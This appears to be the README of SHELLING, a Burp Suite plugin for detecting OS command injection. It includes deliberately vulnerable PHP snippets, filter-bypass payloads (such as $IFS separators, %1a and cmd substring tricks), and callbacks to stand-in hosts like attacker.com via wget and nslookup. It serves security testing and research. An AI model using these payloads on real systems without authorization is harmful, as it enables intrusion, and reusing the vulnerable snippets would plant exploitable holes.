Original work by: Julian H. https://github.com/ewilded/shelling

# SHELLING - a comprehensive OS command injection payload generator
# An OLDER version is currently available in the Burp App Store as Command Injection Attacker. The current version (available here) has already been submitted to the Bapp Store and should be released there soon.

![Logo](logo.png?raw=true)
# What is SHELLING?
This project revolves around detecting OS command and argument injection flaws (not limited to web applications). 

Its main objectives are:
* provide methodology for the OS command injection detection
* provide software implementating this methodology

# How this document is organised
This documentation is divided into two separate sections:
* The first section provides the methodology and results of the OS command and argument injection research conducted for the needs of this project.
* The second section describes current and future tool's capabilities and usage.


# Table of contents - OS command injection
* [Identifying possible reasons of getting false negatives](#identifying-possible-reasons-of-getting-false-negatives)
	* [The syntax problem](#the-syntax-problem)
	* [The problem of input-sanitizing mechanisms](#the-problem-of-input-sanitizing-mechanisms)
		* [Bad characters](#bad-characters)
			* [Argument separators trickery](#argument-separators-trickery)
			* [Command separators trickery](#command-separators-trickery)
			* [More witchcraft](#more-witchcraft)
			* [String separators](#string-separators)
		* [Regular expressions](#regular-expressions)
	* [Platform-specific conditions](#platform-specific-conditions)
	* [The problem of the feedback channel](#the-problem-of-the-feedback-channel)

# Table of contents - the tool
* [User interface](#user-interface)
* [Using the tool](#using-the-tool)
	* [Feedback channels](#feedback-channels)
		* [DNS](#dns)
		* [time](#time)
	* [Payload marking](#payload-marking)
	* [Difference between manual and automatic mode](#difference-between-manual-and-automatic-mode)
		* [The auto mode](#the-auto-mode)
		* [The manual mode](#the-manual-mode)
	* [Different approaches to using this tool](#different-approaches-to-using-this-tool)
	* [Scanner](#scanner)
	* [Intruder](#intruder)
		* [Intruder in auto mode - Collaborator integration!](#intruder-in-auto-mode)
		* [Intruder in manual mode](#intruder-in-manual-mode)
	* [Export](#export)
	* [Byte generator](#byte-generator)
	* [Experimental injection modes](#experimental-injection-modes)
* [Problems and future improvements](#problems-and-future-improvements)
* [Test cases, real cases](#some-case-examples)

# Other projects and special thanks
* [Other recommended tools, projects and special thanks](#tools-i-recommend-using-not-only-in-tandem-with-shelling-but-generally)



# Identifying possible reasons of getting false negatives

Problems to face when creating OS command injection payloads:
* the eventual syntax of the expression we are injecting into (e.g. quoted expressions)
* input sanitizing mechanisms rejecting individual characters (e.g. spaces)
* platform-specific conditions (e.g. there is no "sleep" on windows)
* callback method (e.g. asynchronous execution, no outbound traffic allowed)

The purpose of creating this tool was to reach the non-trivial OS command injection cases, which stay undetected by generally known and used tools and sets of payloads. 


## The syntax problem

Let's consider the following vulnerable PHP script:
```
    <?php
    	if(isset($_GET['username'])) echo shell_exec("echo '{$_GET['username']}'>>/tmp/users.txt");
    ?>
```
What makes this case different from the most common and obvious cases of OS command injection is the fact that the user-controlled variable is injected between single quotes in the final expression passed to the shell_exec function. Hence, one of the most obvious OS command injection test cases, like
`http://localhost/vuln.php?username=;cat /etc/passwd;` would result in the expression being evaluated to echo `';cat /etc/passwd;'`. 
So, instead of executing the command, the entire user input is written into the /tmp/users.txt file.

This particular payload leads to a false negative in this particular case, as it does not fit the target expression syntax in a way that would make shell_exec function treat it as a system command. Instead, the payload is still treated as an argument to the echo command.
In order to properly inject into this particular command, we need to jump out from the quoted expression in the first place. If we simply try payload like `';cat
/etc/passwd;`, the expression would evaluate to echo `'';cat /etc/passwd;'`, we would still get a false negative due to unmatched quoted string following the command we injected.

A payload fitting to this particular syntax should look like `';cat /etc/passwd;'`:
`http://localhost/vuln.php?username=%27;cat /etc/passwd;%27`, making the final expression to look like echo `'';cat /etc/passwd;''`.

And the output is (the injection is working):

    root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin: [...]

This is just one of the examples of how the syntax of the target injectable expression affects the results. The solution to this problem is a good list of vulnerable syntax-varied cases, as we have to guess as many syntax-dependant cases as possible.
For the rest of this write-up, let’s use the following legend:

- OS_COMMAND = the name of the remote binary we want to execute, e.g. `ping`
- ARGUMENT = the argument of the command we want to execute, e.g.`collaborator.example.org`
- ARGUMENT_SEPARATOR = string between the OS_COMMAND and the ARGUMENT, e.g. ` ` (a space)
- FULL_COMMAND=`OS_COMMAND+ARGUMENT_SEPARATOR+ARGUMENT`
- COMMAND_SEPARATOR = a string that separates multiple commands from each other, required for successful injection in most cases (e.g. `&` or `|`)
- COMMAND_TERMINATOR = a sequence which, if injected into a string, enforces the remote system to ignore the remainder of that string (everything that follows the terminator), e.g. `#` on nix (bash) or '::' on win

So, the following list of syntax patterns was created:
- `FULL_COMMAND` - when command is directly injected into an expression
- `FULL_COMMAND+(COMMAND_TERMINATOR or COMMAND_TERMINATOR)` - when the command is directly injected into the beginning of the expression and then it is appended with some arguments/other commands
- `COMMAND_SEPARATOR + FULL_COMMAND` - when command is appended as an argument of a command hardcoded in the expression
- `COMMAND_SEPARATOR + FULL_COMMAND + COMMAND_SEPARATOR` - when the command is appended as an argument to a command hardcoded in the expression AND appended with some arguments/other commands

Additionally, all the above combinations need corresponding versions targeted at quoted expressions.
Single quotes:
- `'FULL_COMMAND'`
- `'FULL_COMMAND+(COMMAND_TERMINATOR or COMMAND_TERMINATOR)'`
- `'COMMAND_SEPARATOR + FULL_COMMAND'`
- `'COMMAND_SEPARATOR+ FULL_COMMAND + COMMAND_SEPARATOR'`

Double quotes:
- `“FULL_COMMAND”`
- `“FULL_COMMAND+(COMMAND_TERMINATOR or COMMAND_TERMINATOR)”`
- `“COMMAND_SEPARATOR+ FULL_COMMAND”`
- `“COMMAND_SEPARATOR+ FULL_COMMAND +COMMAND_SEPARATOR”`


## The problem of input-sanitizing mechanisms

### Bad characters
As it is generally known, blacklist-based approach is a bad security practice. In most cases, sooner or later the attackers find a way around the finite defined list of payloads/characters that are forbidden. Instead of checking if the user-supplied value contains any of the bad things we predicted (e.g. `&` or `;` characters), it's safer to check whether that data looks like it should (e.g. matches a simple regex like `^\w+$` or `^\d+$`) before using it.

Many input-sanitizing functions attempt to catch all potentially dangerous characters that might give the attacker a way to control the target expression and, in consequence, execution.

#### Argument separators trickery
Let's consider the following example:
```
    <?php
    if(isset($_POST['dir'])&&!preg_match('/\s+/',$_POST['dir']))
    {
    	echo "Dir contents are:\n<br />".shell_exec("ls {$_POST['dir']}");
    }
    ?>
```

The script executes the OS command only if the user-supplied variable does not contain any white characters (like spaces or tabs). This is why payloads like:
`cat /etc/passwd`
`;cat /etc/passwd;`
`';cat /etc/passwd;'`

lead to false negatives.

In order to execute an arbitrary command, we need an alternative expression to separate the command from its argument (we need an alternative ARGUMENT_SEPARATOR). 

A way to achieve this is an expression like `$IFS$9`, so the alternative payloads would be:
`cat$IFS$9/etc/passwd`
`;cat$IFS$9/etc/passwd;`
`';cat$IFS$9/etc/passwd;'`

In the unix environment, the `$IFS` environmental variable contains the current argument separator value (which is space by default).
Special caution needs to be taken when injecting `$IFS` as the argument separator. It is critical to make sure that the OS shell will be able to understand where does the variable name end and therefore where does the actual argument start. `ping$IFSlocalhost` will NOT work, because the shell will try to extrapolate a variable called `$IFSlocalhost` - which is obviously not defined. To deal with this, we can insert additional `$9`, which is just a holder of the ninth argument of the current system shell process (which is always an empty string). 
Interestingly, the same principle does not seem to apply to commands like `init$IFS$96` (init 6 -> restart). The command works fine and the shell is not trying to insert variable $96. Instead, it recognizes the presence of `$9`, evaluates it to an empty string and therefore treats the following `6` as an argument.
A way to avoid this confusion is to use the `${IFS}` bracketed expression - just keep in mind this involves the use of two more characters that are likely to be filtered (`{` and `}`).


Below is the list of currently known and supported argument separators.

On nix:
- `%20` - space
- `%09` - horizontal tab
- `$IFS$9` - IFS terminated with 9th (empty) argument holder
- `{OS_COMMAND,ARGUMENT}` - the brace expression (works under bash, does not under dash)

More platform-specific tricks, like IFS override `;IFS=,;cat,/etc/passwd` or char escaping `X=$'cat\x20/etc/passwd'&&$X` will soon be supported as well.


On win:
- `%20` - space
- `%09` - horizontal tab
- `%0b` - vertical tab
- `%25ProgramFiles:~10,1%25` - a hacky cmd expression cutting out a space from the default setting of the %ProgramFiles% environmental variable (`C:\Program Files`)

The above is just an example of bypassing poorly written input-sanitizing function from the perspective of alternative argument separators. 


#### Command separators trickery
Achieving the ability of injecting arbitrary commands usually boils down to the ability of injecting valid command separators first.

Below is the list of working commmand separators:

On unix:
- `%0a` (new line character)
- `%0d` (carriage return character)
- `;`
- `&`
- `|`

On windows:
- `%0a` (new line character)
- `&`
- `|`
- `%1a` - a magical character working as a command separator in .bat files (discovered while researching cmd.exe to find alternative command separators - full description of the finding: http://seclists.org/fulldisclosure/2016/Nov/67)

#### More witchcraft
Also, what's very interesting on win is the fact that the semicolon `;` does NOT work as a command separator. 
This is very sad, because e.g. the `%PATH%` env variable usually looks more-less like this:
`C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;[...]`. 
Therefore it would be great to use an alternative command separator like `%PATH:~19,1%` (substring expression that cuts out the first `;`, so it evaluates to it) with payloads like `a%25PATH:~19,1%25nslookup%25ProgramFiles:~10,1%25evildns.attacker.com%25PATH:~19,1%25`, which would evaluate to `a;nslookup evildns.attacker.com;`.
Unfortunately the default environmental variables under Windows do not contain any supported command separator, like `&`. 
It WOULD work, here's why:

 ![Little test](screenshots/win_shellshock.png?raw=true "Little test")

* This behavior was described long time ago, being called the "Windows version" of the famous bash shellshock vulnerability (https://www.thesecurityfactory.be/command-injection-windows.html)

I am still hoping for some undocumented cmd.exe function that will allow to forge `&` by some sort of single expression (or some hidden, undocumented special environmental variables not visible in `env` output). More research is needed.

By the way, I also really hoped for a similar thing to work on nix. E.g. the `$LS_COLORS` variable looks more-less like: `rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37[...]`.
Hence, I really hoped for expression like `ls .${LS_COLORS:10:1}id` to work (evaluating to `ls .;id` and treating `;` as a command separator). Unfortunately bash plays it safe and treats such a string as a literal:
`ls: cannot access '.;id': No such file or directory`. Who knows... More research is needed (especially with cmd.exe as it is not open source, but also on other shells like dash (and powershell!).

Another good research target are common language functions themselves (e.g. escapeshellcmd() or Java's GetRuntime().exec() - as it has built in protection from injecting additional commands, nothing I tried worked so far - except for argument injection of course, but that always depends on the hardcoded binary that is being called).

#### String separators
Additionally, the following string terminators can be used (in case input was written into a file or a database before execution and our goal was to get rid of everything appended to our payload in order to avoid syntax issues):
- `%00` (nullbyte)
- `%F0%9F%92%A9` (Unicode poo character, known to cause string termination in db software like MySQL)
- `%20#` - space followed by the hash sign (nix)
- `%20::` -  space followed by the `::` cmd.exe one-line comment sequence

This way the base payload set is multiplied by all the feasible combinations of alternative argument separators, command separators and command terminators.

The above separators could include double characters (like two spaces or two tabs, one after another). This is idea for optimisation aimed at defeating improperly written filters which only cut out single instances of banned characters, instead of removing them all. In such case two characters would get reduced to one, bypassing the filter and hitting the vulnerable function.


### Regular expressions

Some input sanitizers are based on regular expressions, checking if the user-supplied input does match the correct pattern (the good, whitelist approach, as opposed to a blacklist).
Still, a good approach can be improperly implemented, creating loopholes. A few examples below.

The following vulnerable PHP will refuse to execute any OS commands as long as the user-supplied input does not START with alphanumeric character/characters:
```
    <?php
    if(isset($_GET['dir'])&&preg_match('/\w+$/',$_GET['dir']))
    {
    	echo "Dir contents are:\n<br />".shell_exec("ls {$_GET['dir']}");
    }
    ?>
```
This is why all of the previously discussed payloads would end up in false negatives. An example payload defeating this filter could be `foo;cat /etc/passwd`.

Another example's regular expression requires the user-supplied value to both start and end with alphanumeric characters:
```
    <?php
    if(isset($_GET['dir'])&&preg_match('/^\w+\..*\w+\.\w+$/',$_GET['dir']))
    {
    	echo "Dir contents are:\n<br />".shell_exec("ls {$_GET['dir']}");
    }
    ?>
```

Due to the fact that it contains a lax the `.*` part in the middle, it is possible to defeat it with a payload starting and ending with an alphanumeric string, like `foo1.co.uk;cat /etc/passwd;foo2.co.uk`. In this case it does not matter that there is no such file as `foo1.co.uk` and that there is no such command as `foo2.co.uk`, what matters is that the command between these prefixes will execute properly. 
These two examples show that all the previously mentioned payloads also require alternatives with proper prefixes and/or suffixes, ideally taken from the original values used and expected by the application. In fact, these payloads (suffixed and prefixed) are the ones most likely to succeed, making their non-suffixed and non-prefixed versions redundant (this fact will be soon used in the best effort payloads feature - not implemented yet).
This makes us extend our base payload set to combinations like:
- `COMMAND_SEPARATOR+FULL_COMMAND+COMMAND_SEPARATOR+SUFFIX`
- `PREFIX+COMMAND_SEPARATOR+ FULL_COMMAND+COMMAND_SEPARATOR`
- `PREFIX+COMMAND_SEPARATOR+ FULL_COMMAND+COMMAND_SEPARATOR+SUFFIX`
- `PREFIX+FULL_COMMAND+SUFFIX`


## Platform-specific conditions

Depending on the technology we are dealing with, some payloads working on some systems will fail on the other. The examples include:
- using windows-specific command on a nix-like system
- using nix-like specific argument separator on a windows system
- dealing with a different underlying system shell (e.g. `cat /etc/passwd #'` will work on bash/ash/dash, but won't work on csh)
- different filesystem PATH values

With this in mind, the best (and currently applied) approach is to use commands and syntaxes that work the same on all tested platforms (the most basic syntax of commands like echo and ping remains the same across nix/win). If this approach turns out not to be exhaustive, alternative base payloads need to be added to the test set.


## The problem of the feedback channel

All the above vulnerable scripts have two common features:
- they are synchronous, meaning that the script does not return any output as long as the command has not returned results, so it is synchronous with
our targeted function 
- they all return the target function's output, meaning that we could actually see the results of the issued commands on the web page.

This conditions are often untrue, especially the second one. So, let's deal with a script like:

```
    <?php
    if(isset($_GET['username']))
    {
    	$out=@shell_exec("ls /home/{$_GET['username']}");
    	file_put_contents('/var/www/user.lookups.txt',$out,FILE_APPEND);
    }
    ?>
```

The above script is synchronous, but does not return output. An alternative that would also be asynchronous would involve saving the command in some file/database entry and having it executed by another process within unknown time (e.g. a scheduled task). 
So, using all the variations of test commands like cat /etc/passwd or echo test would lead to false negatives, because the output is never returned to the browser.
This is why we need alternative feedback channels (which do not necessarily mean ouf of band channels - this terminology rather refers to the way of extracting data). 

A feedback channel is simply the way we collect the indicator of a successful injection/suspicious behavior.

Hence, for command injection, we can have the following feedback channels:
- output (all the above examples except the last one use directly returned output, could as well be indirectly returned, e.g. visible in some other module, put into a file, sent via email and so on, all depending on what the vulnerable feature does and how it returns results)
- response time (e.g. commands like sleep 30 will case noticeable half-minute delay, confirming that the injection was successful, however this will not work with asynchronous scripts)
- network traffic, like reverse HTTP connections (`wget http://a.collaborator.example.org`), ICMP ping requests or/and DNS lookups (ping sub.a.collaborator.example.org)
- file system (if we have access to it; we can attempt to inject commands like `touch /tmp/cmdinject` and then inspect the `/tmp` directory if the file was created - or have the customer to do it for us)
- availability (if all the above fails/is not an option, the only way (without involving third parties) to confirm that the injected command has executed, would be an injection of some sort of payload causing a DoS condition like reboot, shutdown or remove)

In order to avoid false negatives, when no command output is returned by the application, it is necessary to employ payloads utilizing a different feedback channel. Network, particularly DNS (watching for specific domain name lookups coming from the target - this is the main feedback channel usede by Burp Collaborator) is a very good choice, as DNS lookups are usually allowed when no other outbound traffic is permitted. Also, this option is great as it works as well with asynchronous injections.



# The tool
The purpose of the SHELLING tool is to generate a set of payloads capable of penetrating all improperly written sanitizers of user supplied input passed to OS shell overlay functions like `system()`, `shell_exec()` and the like.

It comes in the form of a Burp Suite plugin with the following main functionalities:
* Intruder payload provider
* Scanner extension
* Payload export to clipboard/file
* Single byte generator

The full capabilities of this plugin can only be achieved with Burp Pro version, however the tool can still be used with the free Burp Community version (with its inherent limitations like no Active Scanning and limited Intruder attacks).

## User Interface
Below is a sneak peak of the most important sections of the user interface:

![One](screenshots/one.png?raw=true)

![Two](screenshots/two.png?raw=true)

![Three](screenshots/three.png?raw=true)

![Four](screenshots/four.png?raw=true)

## Using the tool
This section focuses only on explaining the main concepts and their implementation, without describing obvious and/or least important options. Most of the sections below are somehow related and it was not that easy to decide in what order they should be presented. Hence, if anything seems unclear and questions arise, just keep reading on.

The default settings the plugin loads with should be optimum for most scenarios, so the tool can be used out of the box without any adjustments.

## Feedback channels
Two out of above mentioned feedback channels (**DNS** and **time**) are fully supported (can be used out of the box without any additional tools or manual actions taken) in the *auto* mode. Feel free to use other feedback channels (*manual* mode only) whenever necessary.

### DNS
In order to catch both synchronous and asynchronous interactions with our payloads, the tool is using Burp Collaborator (https://portswigger.net/burp/help/collaborator).

Burp Collaborator is heavily used by the Burp Active Scanner. 

It can as well be used manually (just click on 'Burp'->'Burp Collaborator Client' and try it out yourself), so it can be combined with manual or semi-automated attacks (Repeater, Intruder, tampering through proxy, forging files, using external tools and so on).

Luckily, Burp Suite also provides Burp Collaborator API so it can be used by extensions (and this is exactly what this plugin is doing when **DNS** feedback channel is used).

Service-wise, please keep in mind you can either use the default Collaborator service provided by Portswigger or set up your own. 

Having and using a private Collaborator service makes more sense if we set it up with a domain name as short as possible, like x.yz, so the domain names used in the payloads can look like `55.5aglyjo4e8v6j2ot2f255fraw12rqg.n.xy.z` instead of `55.5aglyjo4e8v6j2ot2f255fraw12rqg.burpcollaborator.net`. The longer our payload is, the higher chances for a false negative (the application might reject our payload due to its excessive length before it reaches the vulnerable code).

Also, it's good to always run a health check of the Collaborator service before actually using it.

### time
This is a well known feedback channel for detecting so called 'blind' variant of injection vulnerabilities. It's faster and it does not require external service like DNS. Also, the payloads are shorter. It shouold still be considered less reliable as it will NOT detect asynchronous vulnerabilities, whereas the payload is stored first and then executed by a different process or even system.
Upon successful execution, payloads utilizing this feedback channel (e.g. `sleep 25`) cause a significant delay in the response.

## Payload marking
The payload marking mechanism is very simple. Every single payload generated by the tool has its number (starting at 1). 
If payload marking feature is on, upon generation, all instances of the special holder string `PAYLOAD_MARK` in the argument field are replaced with the payload number. This makes it easier to trace back the result to the successful payload that created it. 

For example, if the command is set to `touch` and the argument is set to `/tmp/owned.PAYLOAD_MARK`, once the attack is finished and there is a file named `/tmp/owned.1337`, we know that payload number 1337 was the one responsible for creating the file. 

We could likewise do something like command=`echo` and argument=`PAYLOAD_MARK>>/tmp/owned`. This way the file `/tmp/owned` would contain all the IDs of the payloads that worked.

The third example could be command=`wget` and argument=`http://attacker.com/owned.PAYLOAD_MARK` if attacker.com is our controlled server to observe interactions.

The fourth example could be command=`nslookup` and argument=`PAYLOAD_MARK.collaborator.attacker.com`, so if our DNS server receives a lookup like `66.collaborator.attacker.com`, we know it was triggered by the 66th payload. 

If payload marking feature is off, the `PAYLOAD_MARK` holder - if present - is simply removed from the eventual payload.

## Difference between manual and automatic mode
The mode setting only applies to Intruder and Export (and is ignored by the Active Scanning extension, which is always using the *auto* mode regardless to this setting).

### The auto mode 
This mode is enabled by default and recommended.
The automatic mode does not allow one to explicitly specify the command to be injected and neither its argument. In this mode, the actual command used in the payload depends on the feedback channel (e.g. `nslookup` vs `sleep`) and the target OS (e.g. `sleep 25` for nix and `ping -n 25 localhost` for win, because `sleep` is not a thing on win). Also, whereas **DNS** serves as the feedback channel, payload marking is enforced. 

#### Combining Intruder with Collaborator
The coolest thing about the *auto* mode is the automated use of the Burp Collaborator service without the need to:
* manually running the Burp Collaborator Client
* copying the domain names from it (*Copy to clipboard*)
* putting them into our payloads/configuration
* keeping the Burp Collaborator Client window open, watching it for interactions

Again, this mode is always used by the Scanner extension anyway regardless to the setting, which means this setting only applies to Intruder and Export. Yes, this means that by default Intruder attacks using payloads provided by this tool **WILL DETECT** Collaborator interactions (either right away or long after the attack was finished) ... and **create issues in the Target, just like they came from the Scanner**! 

Every time a set of payloads is generated (in result of running an Active Scan, an Intruder attack or an Export to file/clipboard) with **DNS** as the feedback channel, SHELLING requests the Collaborator service to create a new unique subdomain (just like if we hit the *Copy to clipboard* button in the Burp Collaborator Client - except it happens automatically) and remembers it after the payload set is generated. Every time the Collaborator Service returns interactions, they are all matched against all the domains generated and tracked till this point. By matching the subdomain and the payload marker, it is possible to identify the exact payload/payloads that caused it and (for Scanner and Intruder) trace the base request used for the attack. This set of information is sufficient for automatic insertion of a new issue to the *Issues* list in the *Site Map*, both for Active Scanning and Intruder attacks (this won't work for Export only because there is no base request associated with its instance). See the Intruder section for an actual example (you won't see this trick in any other Burp plugin :D).

##### Why?
The main reason for implementing this Collaborator-enabled, Scanner-like capability for Intruder was the same reason we use Intruder. Sometimes we do not want to run a full Active Scan of a particular insertion point (with all the Scanner checks enabled, while disabling them just for one scanning task only to enable them again right after running it would be even more cumbersome), but instead we only want to test that insertion point for a particular vulnerability, like OS command injection. Also, Intruder gives us insight into the responses (while the scanner alone does not) -  speaking of which, check out this: https://github.com/ewilded/shelling/blob/master/README.md#flow.

### The manual mode
The manual mode does not allow one to specify the feedback channel, as we take care of the feedback channel ourselves.

In turn, it gives control over the command and argument, so we can use a configuration like command=`touch` with argument=`/tmp/owned.PAYLOAD_MARK` (payload marking can be still used with manual mode), making the file system our feedback channel.

Another example would be command=`echo` and argument = `1337`. Then we add `1337` to the 'Grep - match' option of the Intruder attack, using the direct output as the feedback channel (without payload marking).

Also, payload marking does not make much sense when using time as the feedback channel (there either is a significant delay or not). But of course we could still do it in manual mode: command=`sleep` and argument=`PAYLOAD_MARK`, so if the payload works, the additional delay in seconds will be equal to the payload number.

## Different approaches to using this tool
With its default configuration, SHELLING currently generates around 200 payloads (using most reasonable base syntaxes, terminator and encoding settings). This is a relatively high number and it will be reduced in future releases, with the default setting moving towards best effort payloads (so ideally the tool would only be using the user-defined *X* first payloads from the list ordered by the likelihood of success).

With all possible options enabled (all base syntaxes, target operating systems, evasive techniques and other types of injections) this number grows to thousands. 

Therefore, using the full payload set is obviously not reliable for normal testing and is in my opinion an example of what what James Kettle called "the million payload approach" - explaining that scanners HAVE TO provide best effort payloads instead.

I personally believe that the full payload set provides us with high confidence about the profoundness of the test we conducted against the particular input, but for practical reasons this approach should only be taken against features with high likelihood of calling local binaries/scripts (like any system, diagnostic or file-related tools).

Another scenario for using the full payload set are inputs that behave in a suspicious way (e.g. potential code injection issues detected by the Backslash Powered Scanner) and we are trying to guess the proper syntax and other input conditions - or at least partially automate and therefore speed up the guessing process, providing us with the clear list of payloads we have already tried.

## Scanner
**CAUTION:** Always make sure the item you are about to Scan/Intrude is added to the scope! Issues added from Burp Extensions to targets not in the scope do not pop up!

Active Scanning is by default enabled in the *Global settings*:
![Global settings](screenshots/active_scanning.png?raw=true "Global settings")

A set of payloads (and a separate Collaborator session) is generated individually for each of the insertion points. So, if we decide to scan the entire request (e.g. right click on the request/response in any tool -> `Do an active scan`), there number of active insertion points tested will directly depend on the request and Scanner's `Options -> Attack Insertion Points` configuration.

Scans can be run on individual insertion points only, using Intruder:
![Individual insertion point](screenshots/active_scanning2.png?raw=true "Individual insertion point")

## Intruder
*A tip*: I personally recommend setting the  Intruder's "new tab behavior" to copy settings from the previous tab:
![New tab behavior](screenshots/new_tab_behavior.png?raw=true "New tab behavior")

It saves a lot of time and clicking (every new Intruder attack will automatically have the configuration copied from the previous one, so we do not have to set all the options up all over again).

Setting up SHELLING for use with Intruder is very simple (once done, this setting will be copied to every new Intruder tab):
1) Send the request of choice to Intruder:
![Setting up Intruder](screenshots/send_to_intruder.png?raw=true "Setting up Intruder")

2) Pick `Extension generated` as the payload type:
![Setting up Intruder](screenshots/setting_up_intruder.png?raw=true "Setting up Intruder")

3) Pick `Command injection` as the generator:
![Setting up Intruder](screenshots/setting_up_intruder2.png?raw=true "Setting up Intruder")

4) Make sure that the `Payload Encoding` is off (the output character encoding is handled separately by the tool from the `Evasive techniques` tab and the default encoding is URL):
![Setting up Intruder](screenshots/setting_up_intruder3.png?raw=true "Setting up Intruder")

5) Make sure the target is added to the scope:
![Scope](screenshots/scope.png?raw=true "Scope")

### Intruder in auto mode
OK, time for some magic! 
The Intruder attack is already set. 
Now let's just make sure the SHELLING mode is set to *auto* (it is by default):
![Setting up Intruder](screenshots/auto_mode1.png?raw=true "Setting up Intruder")

Now, we can already hit "Start"... However if we want to be able to see a bit of what's going on under the hood:
* Go to the `Advanced` tab in SHELLING and enable "Verbose extension output":
![Verbose output](screenshots/verbose_output.png?raw=true "Verbose output")

This will turn on debug information in the Extender -> Shelling -> Output tab:
![Verbose output](screenshots/verbose_output2.png?raw=true "Verbose output")

As we can see, at this point there are no issues for the target:
![No issues](screenshots/no_issues.png?raw=true "No issues")

We hit "Start attack" and watch the magic happen:
Issue pops up:
![Magic happens](screenshots/magic_happens1.png?raw=true "Magic happens")

Plugin verbose output:
![Magic happens](screenshots/magic_happens2.png?raw=true "Magic happens")

### Intruder in manual mode
Nothing exciting, check it out for yourself if you need it.

## Export
Payloads can be exported directly to the clipboard as well as to a text file (so they can be used with external tools, e.g. Intruder run from a Burp Suite installation that does not have SHELLING installed - or maybe even a tool using those payloads to test an application using a totally different protocol than HTTP (e.g. SIP, FTP, SMTP, Telnet, whatever).

## Byte generator
The *Byte generator* is an additional auxiliary payload provider (can be used with Intruder instead of the `Command injection` generator. It provides the following predefined byte ranges:

![Byte generator](screenshots/byte_generator.png?raw=true "Byte generator")

I personally found it very useful for general fuzzing and research, like:
* trying to discover alternative:
  * argument/command separators
  * string terminators
  * breakout sequences
  * error conditions


## Experimental injection modes
SHELLING also supports two experimental injection modes (early stage of development):
* argument injection (please refer to https://github.com/ewilded/shelling/blob/master/DETECTING_ARGUMENT_INJECTION.md for more details and feel free to play with it yourself)
* terminal injection (also known as escape sequence injection vulnerability, e.g. `curl -kis http://www.example.com/%1b%5d%32%3b%6f%77%6e%65%64%07%0a`)

## Problems and future improvements
Please refer to TODO.txt. Also, I am always happy to see feedback. If you come across issues, false negatives or ideas for improvement, don't be shy.


## Some case examples
### 1) Test cases
For example test cases (the number of all supported cases should be bigger than the total number of payloads generated) please refer to the  https://github.com/ewilded/shelling/tree/master/test_cases directory. Below is a screenshot with the current results of these test cases, reflecting the coverage and tool's expected behavior:

![Test results](screenshots/test_results.png?raw=true)


### 2) Some real examples
- https://chris-young.net/2017/04/12/pentest-ltd-ctf-securi-tay-2017-walkthrough/
- https://www.exploit-db.com/exploits/41892/
- https://www.exploit-db.com/exploits/34461/


## Recommended tools, projects and special thanks
### Tools I recommend using (not only in tandem with SHELLING, but generally)
#### Flow
An extremely useful Burp Suite plugin simply allowing to monitor and search all the traffic processed by ALL Burp Suite plugins (Proxy, Intruder, Scanner, Extender, Target...). Only when using this plugin you can really know what you are ACTUALLY doing with Burp: https://github.com/PortSwigger/flow

#### Backslash Powered Scanner
The revolutionary, providing research-quality findings Backslash Powered Scanner by James Kettle: https://github.com/PortSwigger/backslash-powered-scanner

#### Error message checks
Although not directly related, this plugin allows better oversight of the responses we are receiving when using Active Scanning. 

The capability of defining our own error message patterns along with their type and severity makes it possible to watch Scanner responses for patterns of our choice without the need of writing our own dedicated plugin: https://github.com/augustd/burp-suite-error-message-checks

#### Daniel Bohannon's research 
The mind-blowing science and art of command obfuscation by Daniel Bohannon: https://github.com/danielbohannon

#### Special thanks
I would like to express my special thanks to Dawid Goluński and Daniel Bohannon for providing food for thought and inspiration for this project with their awesome work!
Also, special thanks to Marcin Wołoszyn for the extremely useful Flow plugin! Helps me everyday, both with testing AND my own plugin development. 
Keep it up, guys!
